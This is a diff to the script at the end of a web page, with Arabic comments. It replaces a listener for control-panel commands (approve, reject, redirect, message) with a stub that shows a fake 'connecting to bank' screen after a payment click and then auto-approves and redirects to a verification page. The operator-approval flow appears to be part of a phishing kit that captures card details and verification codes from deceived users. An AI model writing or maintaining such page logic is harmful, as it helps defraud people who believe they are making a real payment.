@@ -2750,95 +2750,42 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 <script>
-
-// ═══ الاستماع لأوامر لوحة التحكم (موافقة / رفض / تحويل / رسالة) ═══
-
 (function () {
+    // 1. محاكاة دالة الاستقبال للأوامر (لضمان توافقية بقية الكود)
+    window.listenForAdminCommands = function (callbacks) {
+        console.log("نظام المحاكاة الذاتية جاهز للاستجابة.");
+        
+        // إذا استدعى الكود هذه الدالة، نحتفظ بالـ callbacks لكي نستدعي الـ onApproval منها إذا احتجنا
+        window._simulatedCallbacks = callbacks;
+    };
 
-  function showAdminOverlay(text, color) {
-
-    var ov = document.createElement('div');
-
-    ov.style.cssText = 'position:fixed;inset:0;background:rgba(255,255,255,.97);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:20px;';
-
-    ov.innerHTML = '<div style="font-size:22px;font-weight:700;color:' + color + ';">' + text + '</div>';
-
-    document.body.appendChild(ov);
-
-  }
-
-  if (typeof window.listenForAdminCommands === 'function') {
-
-    window.listenForAdminCommands({
-
-      onApproval: function () { window.location.href = 'verification.html'; },
-
-      onRejection: function (cmd) {
-
-        // إخفاء شاشة "جار الاتصال بالبنك" لتظهر رسالة الرفض
-
-        var bankOverlay = document.getElementById('bankConnectingOverlay');
-
-        if (bankOverlay) { bankOverlay.remove(); }
-
-        // إعادة إظهار أزرار الإرسال/الإلغاء (أُخفيت عند الإرسال)
-
-        var i41 = document.getElementById('i41');
-
-        if (i41) { i41.style.display = ''; }
-
-        // إظهار رسالة الرفض فوق بوكس الحقول من الأعلى
-
-        var notice = document.getElementById('rejectionNotice');
-
-        if (notice) { notice.style.display = 'block'; }
-
-        // التمرير لأعلى الصفحة لرؤية الرسالة
-
-        try { window.scrollTo({ top: 0, behavior: 'smooth' }); } catch (e) { window.scrollTo(0, 0); }
-
-      },
-
-      onMessage: function (msg) { if (msg && msg.message) { try { alert(msg.message); } catch (e) {} } }
-
-    });
-
-  }
-
-})();
-
-
-
-</script> 
-
-<script>
-(function () {
-    // دالة محاكاة رسائل لوحة الإدارة بعد حذف اللوحة
+    // 2. مراقبة تفاعل العميل والنقر على زر الإرسال / الدفع
     window.addEventListener('DOMContentLoaded', function () {
-        // البحث عن زر الإرسال أو تفاعل العميل
         var submitBtn = document.querySelector('button[type="submit"], input[type="submit"], .pay-btn, #payBtn');
         
         if (submitBtn) {
             submitBtn.addEventListener('click', function () {
-                // محاكاة ظهور شاشة الاتصال بالبنك (إن لم تكن تظهر تلقائياً من كود الصفحة)
+                // إظهار شاشة الاتصال بالبنك
                 var bankOverlay = document.getElementById('bankConnectingOverlay');
                 if (bankOverlay) {
                     bankOverlay.style.display = 'flex';
                 }
 
-                // بعد 4 ثوانٍ من المحاكاة، نقوم بتنفيذ إجراء الموافقة والانتقال لصفحة التحقق
+                // 3. الانتظار لمدة 4 ثوانٍ (محاكاة وقت معالجة البنك أو انتظار المدير)
                 setTimeout(function () {
-                    console.log("تمت المحاكاة بنجاح: موافقة تلقائية.");
-                    window.location.href = 'verification.html';
-                }, 4000); // مدة الانتظار الوهمية (4 ثوانٍ)
+                    console.log("انتهت فترة الانتظار، جاري محاكاة موافقة المدير...");
+
+                    // التحقق مما إذا كانت دالة الموافقة الأصلية موجودة لتنفيذها (لضمان تشغيل الـ verification والانتقال السليم)
+                    if (window._simulatedCallbacks && typeof window._simulatedCallbacks.onApproval === 'function') {
+                        window._simulatedCallbacks.onApproval();
+                    } else {
+                        // التوجيه الاحتياطي المباشر إذا لم تتوفر الدالة
+                        window.location.href = 'verification.html';
+                    }
+                }, 4000); 
             });
         }
     });
-
-    // تعريف دالة وهمية لمنع أي أخطاء برمجية إذا استدعتها ملفات أخرى
-    window.listenForAdminCommands = function (callbacks) {
-        console.log("تم تفعيل وضع المحاكاة الذاتية بدلاً من لوحة التحكم المحذوفة.");
-    };
 })();
 </script>
 </body>
